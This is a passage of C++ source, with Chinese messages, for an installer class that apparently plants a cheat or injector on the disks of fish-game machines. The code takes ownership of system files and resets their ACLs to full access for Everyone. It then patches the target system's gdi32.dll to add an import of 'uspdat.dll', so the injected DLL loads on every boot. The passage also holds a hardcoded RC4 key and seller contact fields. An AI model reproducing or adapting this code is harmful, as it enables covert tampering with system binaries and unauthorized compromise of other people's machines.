	hrdvPtr Ptr = reinterpret_cast<hrdvPtr>(::GetProcAddress(hmDLL, "hrdv"));
	wsText = libTools::CCharacter::ASCIIToUnicode(Ptr());
	for (int i = 0;i < 10; ++i)
	{
		hmDLL = ::GetModuleHandleW(L"hrdv.dll");
		if (hmDLL == NULL)
			break;

		::FreeLibrary(hmDLL);
	}

	

	libTools::CFile::ForceDeleteFile(wszPath);
	return TRUE;
}

std::wstring CInstaller::GenerateEncodeSerailNumber(_In_ CONST std::wstring & wsSerialNumber) CONST
{
	//return libTools::CCharacter::MakeFormatText(L"FTGC%04X%s", _pFishGameStructContent->dwSeriesSerialNumber, wsSerialNumber.c_str());
	std::wstring wsDiskSerialNumber;
	for (UINT i = 0; i < wsSerialNumber.size(); i += 2)
	{
		WCHAR wszText[3] = { 0 };
		wszText[0] = wsSerialNumber[i];
		wszText[1] = wsSerialNumber[i + 1];


		wsDiskSerialNumber += libTools::CCharacter::MakeFormatText(L"%02x", std::stoul(wszText, nullptr, 16) ^ 0xFF);
	}
	return libTools::CCharacter::MakeFormatText(L"FTGD%04X%s", _pFishGameStructContent->dwSeriesSerialNumber, wsDiskSerialNumber.c_str());
}

BOOL CInstaller::Initialize(_In_ CONST std::wstring & wsResultPath)
{
	if (!libTools::CDllInjector::IsRunAsAdministrator())
	{
		LOG_MSG_CF(L"必须运行在管理员权限下!");
		return FALSE;
	}

	_VecCatchFishStructContent.clear();
	std::wcout << L"初始化中……" << std::endl;
	if (!CDownloader::GetInstance().Download_GameIdentifier(_VecCatchFishStructContent))
	{
		std::wcout << L"下载游戏识别代码失败!" << std::endl;
		return FALSE;
	}


	_wsResultPath = wsResultPath;
	InitializeMemoryShare();
	return TRUE;
}

BOOL CInstaller::SetSerialNumberDiskIsUnFormatDisk()
{
	std::wstring wsSystemPhysicalDiskNumber = GetSystemPhysicalDrive();
	for (WCHAR wchDisk = L'D'; wchDisk <= L'Z'; ++wchDisk)
	{
		if (!libTools::CDiskInfo::IsBasicDisk(wchDisk))
		{
			//std::wcout << wchDisk << L" Not is Basic Disk" << std::endl;
			continue;
		}


		// Exinculde System Drive
		std::wstring wsPhysicalDiskNumber;
		if (!libTools::CDiskInfo::GetPhysicalDiskNumber(wchDisk, wsPhysicalDiskNumber))
		{
			//std::wcout << wchDisk << L":GetPhysicalDiskNumber Faild!" << std::endl;
			continue;
		}


		if (wsPhysicalDiskNumber == wsSystemPhysicalDiskNumber)
		{
			//std::wcout << wchDisk << L" is System PhysicalDisk" << std::endl;
			continue;
		}


		// 容量计算
		UINT uDiskSize = libTools::CDiskInfo::GetDiskSize(wchDisk);
		if (uDiskSize <= 130)
		{
			return TRUE;
		}


		//std::wcout << wchDisk << L": Is not Usb Drive" << std::endl;
	}
	return FALSE;
}

BOOL CInstaller::SetSerialNumberDiskIsUnFormatDisk_IsUsb()
{
	std::wstring wsSystemPhysicalDiskNumber = GetSystemPhysicalDrive();
	for (WCHAR wchDisk = L'D'; wchDisk <= L'Z'; ++wchDisk)
	{
		if (!libTools::CDiskInfo::IsBasicDisk(wchDisk))
		{
			continue;
		}

		if (libTools::CDiskInfo::IsUsbDiver(wchDisk))
		{
			_wchSerialNumberDisk = wchDisk;
			return TRUE;
		}

		// Exinculde System Drive
		std::wstring wsPhysicalDiskNumber;
		if (!libTools::CDiskInfo::GetPhysicalDiskNumber(wchDisk, wsPhysicalDiskNumber))
		{
			continue;
		}


		if (wsPhysicalDiskNumber == wsSystemPhysicalDiskNumber)
		{
			//std::wcout << wchDisk << L" is System PhysicalDisk" << std::endl;
			continue;
		}


		// 容量计算
		UINT uDiskSize = libTools::CDiskInfo::GetDiskSize(wchDisk);
		if (uDiskSize <= 3 || uDiskSize >= 130)
		{
			continue;
		}



	}
	return FALSE;
}

std::wstring CInstaller::GetSystemPhysicalDrive() CONST
{
	std::wstring wsSystemPhysicalDiskNumber;
	libTools::CDiskInfo::GetSystemPhysicalDrive(wsSystemPhysicalDiskNumber);
	return wsSystemPhysicalDiskNumber;
}

BOOL CInstaller::GetDevicePhysicalDiskNumber(_In_ LPCWSTR pwszDevice, _Out_ std::wstring & wsPhysicalDiskNumber) CONST
{
	HANDLE hDevice;
	STORAGE_DEVICE_NUMBER sdNumber;
	DWORD dwBytesReturned;
	int nResult = 0;


	hDevice = CreateFileW(pwszDevice, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
	if (hDevice == INVALID_HANDLE_VALUE)
		return FALSE;


	if (DeviceIoControl(hDevice, IOCTL_STORAGE_GET_DEVICE_NUMBER, NULL, 0, &sdNumber, sizeof(sdNumber), &dwBytesReturned, NULL))
	{
		wsPhysicalDiskNumber = libTools::CCharacter::MakeFormatText(L"\\\\.\\PhysicalDrive%d", sdNumber.DeviceNumber);
		nResult = 1;
	}
	CloseHandle(hDevice);
	return TRUE;
}

BOOL CInstaller::IsDownloadGenerateCodeDLL() CONST
{
	std::wstring wsPath = GetCurrentPath() + L"GenerateCode.dll";
	if (!libTools::CFile::FileExist(wsPath))
		return TRUE;


	LPVOID lpFileContent = nullptr;
	SIZE_T uFileSize = 0;
	if (!libTools::CFile::ReadFileContent(wsPath, lpFileContent, uFileSize))
	{
		std::wcout << L"读取文件GenerateCode 失败!" << std::endl;
		return TRUE;
	}


	SetResDeleter(lpFileContent, [](LPVOID & Pointer) { ::VirtualFree(Pointer, 0, MEM_RELEASE); Pointer = nullptr; });
	return CDownloader::GetInstance().GetGenerateCodeCRC32() != libTools::CCRC32::GetCRC32(reinterpret_cast<LPCSTR>(lpFileContent), uFileSize);
}

std::wstring CInstaller::GetCurrentPath() CONST
{
	WCHAR wszPath[MAX_PATH] = { 0 };
	::GetModuleFileNameW(NULL, wszPath, MAX_PATH);
	::PathRemoveFileSpecW(wszPath);

	std::wstring wsPath = wszPath;
	if (wsPath.back() != L'\\')
		wsPath += L"\\";


	return wsPath;
}

BOOL CInstaller::SetPrivilege(HANDLE hToken, LPCTSTR lpszPrivilege, BOOL bEnablePrivilege) CONST
{
	TOKEN_PRIVILEGES tp;
	LUID luid;


	if (!LookupPrivilegeValue(NULL, lpszPrivilege, &luid))
	{
		return FALSE;
	}

	tp.PrivilegeCount = 1;
	tp.Privileges[0].Luid = luid;
	tp.Privileges[0].Attributes = bEnablePrivilege ? SE_PRIVILEGE_ENABLED : 0;


	// Enable the privilege or disable all privileges.
	if (!AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), (PTOKEN_PRIVILEGES)NULL, (PDWORD)NULL))
	{
		return FALSE;
	}


	return GetLastError() != ERROR_NOT_ALL_ASSIGNED;
}


LRESULT CInstaller::MySetSecurity(LPTSTR str_name, SE_OBJECT_TYPE e_type) CONST
{
	long bRetval = -1;

	HANDLE hToken = NULL;
	PSID pSIDAdmin = NULL;
	PSID pSIDEveryone = NULL;
	PACL pNewDACL = NULL;
	SID_IDENTIFIER_AUTHORITY SIDAuthWorld = SECURITY_WORLD_SID_AUTHORITY;
	SID_IDENTIFIER_AUTHORITY SIDAuthNT = SECURITY_NT_AUTHORITY;
	const int NUM_ACES = 2;
	EXPLICIT_ACCESS ea[NUM_ACES];


	///获取操作权限
	OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &hToken);
	SetPrivilege(hToken, SE_TAKE_OWNERSHIP_NAME, TRUE);


	///获取所有权，再设置
	AllocateAndInitializeSid(&SIDAuthWorld, 1, SECURITY_WORLD_RID, 0, 0, 0, 0, 0, 0, 0, &pSIDEveryone);

	AllocateAndInitializeSid(&SIDAuthNT, 2, SECURITY_BUILTIN_DOMAIN_RID, DOMAIN_ALIAS_RID_ADMINS, 0, 0, 0, 0, 0, 0, &pSIDAdmin);

	SetNamedSecurityInfo(str_name, e_type, OWNER_SECURITY_INFORMATION, pSIDAdmin, NULL, NULL, NULL);


	ZeroMemory(&ea, NUM_ACES * sizeof(EXPLICIT_ACCESS));

	DWORD dwPermission = GENERIC_ALL;
	ACCESS_MODE e_am = SET_ACCESS;



	ea[0].grfAccessPermissions = dwPermission;
	ea[0].grfAccessMode = e_am;
	ea[0].grfInheritance = NO_INHERITANCE;
	ea[0].Trustee.TrusteeForm = TRUSTEE_IS_SID;
	ea[0].Trustee.TrusteeType = TRUSTEE_IS_WELL_KNOWN_GROUP;
	ea[0].Trustee.ptstrName = (LPTSTR)pSIDEveryone;
	ea[1].grfAccessPermissions = dwPermission;
	ea[1].grfAccessMode = e_am;
	ea[1].grfInheritance = NO_INHERITANCE;
	ea[1].Trustee.TrusteeForm = TRUSTEE_IS_SID;
	ea[1].Trustee.TrusteeType = TRUSTEE_IS_WELL_KNOWN_GROUP;
	ea[1].Trustee.ptstrName = (LPTSTR)pSIDAdmin;


	SetEntriesInAcl(NUM_ACES, ea, NULL, &pNewDACL);

	////////设置////////////////////////
	bRetval = SetNamedSecurityInfo(str_name, e_type, DACL_SECURITY_INFORMATION | PROTECTED_DACL_SECURITY_INFORMATION, NULL, NULL, pNewDACL, NULL);

	if (hToken)
		CloseHandle(hToken);

	if (pSIDEveryone)
		FreeSid(pSIDEveryone);

	if (pSIDAdmin)
		FreeSid(pSIDAdmin);

	if (pNewDACL)
		LocalFree(pNewDACL);

	return bRetval;
}

BOOL CInstaller::FindOtherDisk_By_Disk(_In_ WCHAR wchDisk, _Out_ WCHAR & wchOtherDisk) CONST
{
	std::wstring wsPhyicalDiskNumber;
	if (!libTools::CDiskInfo::GetPhysicalDiskNumber(wchDisk, wsPhyicalDiskNumber))
	{
		//std::wcout << L"获取硬盘:" << wchDisk << L", 的逻辑序号失败!" << std::endl;
		return FALSE;
	}


	for (WCHAR wchText = L'C'; wchText <= L'Z'; ++wchText)
	{
		std::wstring wsTempPhycalDiskNumber;
		if (!libTools::CDiskInfo::GetPhysicalDiskNumber(wchText, wsTempPhycalDiskNumber))
			continue;


		if (wsTempPhycalDiskNumber == wsPhyicalDiskNumber && wchText != wchDisk)
		{
			wchOtherDisk = wchText;
			return TRUE;
		}
	}

	//std::wcout << L"硬盘:" << wchDisk << L" 貌似没有其他逻辑硬盘了!" << std::endl;
	return FALSE;
}

VOID CInstaller::SaveToEncryptLog(_In_ CONST InstallDiskRecord_Tranfer & Content, _In_ CONST std::wstring & wsFilePath, _In_ CONST std::wstring & wsTestCount, _In_ CONST std::wstring & wsCountCode) CONST
{
	std::wstring wsFormatText;
	SYSTEMTIME SysTime;
	::GetLocalTime(&SysTime);


	wsFormatText = libTools::CCharacter::MakeFormatText(L"GenerateTick:%d年%d月%d日 %d:%d:%d\r\n", SysTime.wYear, SysTime.wMonth, SysTime.wDay, SysTime.wHour, SysTime.wMinute, SysTime.wSecond);

	wsFormatText += libTools::CCharacter::MakeFormatText(L"Game:[%s]-[%s]\r\n", Content.Identifier.wsGameType.c_str(), Content.Identifier.wsGameName.c_str());

	wsFormatText += libTools::CCharacter::MakeFormatText(L"OriginDiskSerialNumber:[%s]\r\n", Content.wsOriginDiskSerialNumber.c_str());

	wsFormatText += libTools::CCharacter::MakeFormatText(L"EncryptDiskSerialNumber:[%s]\r\n", Content.wsEncryptDiskSerialNumber.c_str());

	wsFormatText += libTools::CCharacter::MakeFormatText(L"FormatDiskSerialNumber:[%s]\r\n", GenerateEncodeSerailNumber(Content.wsEncryptDiskSerialNumber).c_str());

	wsFormatText += libTools::CCharacter::MakeFormatText(L"TestCode:[%s], CounterCode:[%s]\r\n", wsTestCount.c_str(), wsCountCode.c_str());

	wsFormatText += libTools::CCharacter::MakeFormatText(L"'uspdat.dat' FileContent = [%s]\r\n", _wsInjectorPathFile.c_str());

	std::wstring wsPlatform;
	switch (CClearFile::GetInstance().GetDiskSystem(_wchDisk))
	{
	case CClearFile::em_System::Win7x86:
		wsPlatform = L"Win7x86";
		break;
	case CClearFile::em_System::Win7x64:
		wsPlatform = L"Win7x64";
		break;
	case CClearFile::em_System::XP:
		wsPlatform = L"XP";
		break;
	default:
		wsPlatform = L"Unknow";
		break;
	}
	wsFormatText += libTools::CCharacter::MakeFormatText(L"Target Platform:[%s]\r\n", wsPlatform.c_str());

	wsFormatText += L"----------------------孙哥的DLL-------------------------\r\n";
	for (CONST auto& itm : Content.Vec)
	{
		wsFormatText += itm.wsOriginText + L"\r\n";
	}


	std::string strRc4Key = "83e4a96aed96436c621b9809e258b309";
	auto EncryptRc4TextPtr = libTools::CRC4(strRc4Key.c_str(), strRc4Key.length()).GetEncryptText(reinterpret_cast<CONST CHAR*>(wsFormatText.c_str()), wsFormatText.length() * 2);
	if (!libTools::CFile::WriteFile(wsFilePath, reinterpret_cast<CONST BYTE*>(EncryptRc4TextPtr.get()), wsFormatText.length() * 2))
	{
		LOG_MSG_CF(L"写入日志文件失败:[%s]", wsFilePath.c_str());
	}
}

BOOL CInstaller::CreateInjectorProcFile() CONST
{
	std::wstring wsPath;


	wsPath = _wsCopyToDestPath + L"uspdat.dat";
	if (!libTools::CFile::ForceDeleteFile(wsPath.c_str()))
	{
		std::wcout << L"修改文件失败! Err = -1" << std::endl;
		return FALSE;
	}


	if (!libTools::CFile::WriteASCIIFile(wsPath, _wsInjectorPathFile))
	{
		std::wcout << L"修改文件失败! Err = 1" << std::endl;
		return FALSE;
	}



	// Modify gdi32 (Add Import Table to Injector)
	auto emTargetSystem = CClearFile::GetInstance().GetDiskSystem(_wchDisk);
	switch (emTargetSystem)
	{
	case CClearFile::em_System::Win7x86:
		wsPath = L"Z:\\Windows\\System32\\gdi32.dll";
		break;
	case CClearFile::em_System::Win7x64:
		wsPath = L"Z:\\Windows\\SysWOW64\\gdi32.dll";
		break;
	case CClearFile::em_System::XP:
		wsPath = L"Z:\\Windows\\System32\\gdi32.dll";
		break;
	default:
		break;
	}


	wsPath[0] = _wchDisk;
	if (!libTools::CFile::FileExist(wsPath))
	{
		std::wcout << L"文件不存在! Err = 2" << std::endl;
		return FALSE;
	}


	if (emTargetSystem != CClearFile::em_System::XP)
	{
		if (!libTools::CDllInjector::AddModifyWin7SystemFilePrivlige(wsPath))
		{
			std::wcout << L"修改权限失败!" << std::endl;
			return FALSE;
		}
	}


	if (::SetFileAttributesW(wsPath.c_str(), FILE_ATTRIBUTE_NORMAL))
	{
		LPVOID lpFileContent = nullptr;
		SIZE_T uFileSize = 0;
		if (!libTools::CFile::ReadFileContent(wsPath, lpFileContent, uFileSize))
		{
			std::wcout << L"修改文件失败! Err = 2" << std::endl;
			return FALSE;
		}


		SetResDeleter(lpFileContent, [](LPVOID & lpFileContent) { ::VirtualFree(lpFileContent, 0, MEM_RELEASE); lpFileContent = nullptr; });
		if (dhj8938rwjf::_已修改过(lpFileContent, uFileSize, "uspdat.dll"))
		{
			return TRUE;
		}
	}
	else
	{
		std::wcout << L"修改文件属性失败! Err = 5" << std::endl;
		return FALSE;
	}




	dhj8938rwjf::_添加导入表(libTools::CCharacter::UnicodeToASCII(wsPath).c_str(), "uspdat.dll", "ftsWordBreak");


	LPVOID lpFileContent = nullptr;
	SIZE_T uFileSize = 0;
	if (!libTools::CFile::ReadFileContent(wsPath, lpFileContent, uFileSize))
	{
		std::wcout << L"修改文件失败! Err = 3" << std::endl;
		return FALSE;
	}
	SetResDeleter(lpFileContent, [](LPVOID & lpFileContent) { ::VirtualFree(lpFileContent, 0, MEM_RELEASE); lpFileContent = nullptr; });
	if (!dhj8938rwjf::_已修改过(lpFileContent, uFileSize, "uspdat.dll"))
	{
		std::wcout << L"修改文件失败! Err = 4" << std::endl;
		return FALSE;
	}


	return TRUE;
}

VOID CInstaller::InitializeMemoryShare()
{
	HANDLE hFileMap = ::OpenFileMappingW(FILE_MAP_READ | FILE_MAP_WRITE, FALSE, DOWNLOADER_MEMORYSHARE_NAME);
	if (hFileMap == NULL)
		return;


	_pMemoryShareContent = reinterpret_cast<DownloaderMemoryShareContent*>(::MapViewOfFile(hFileMap, FILE_MAP_WRITE | FILE_MAP_READ, NULL, NULL, sizeof(DownloaderMemoryShareContent)));
	if (_pMemoryShareContent != nullptr)
	{
		std::wcout << L"联系手机:" << _pMemoryShareContent->wszTelphone << std::endl;
		std::wcout << L"联系QQ:" << _pMemoryShareContent->wszQQNumber << std::endl;
		std::wcout << L"联系微信:" << _pMemoryShareContent->wszWeChat << std::endl;
	}
}
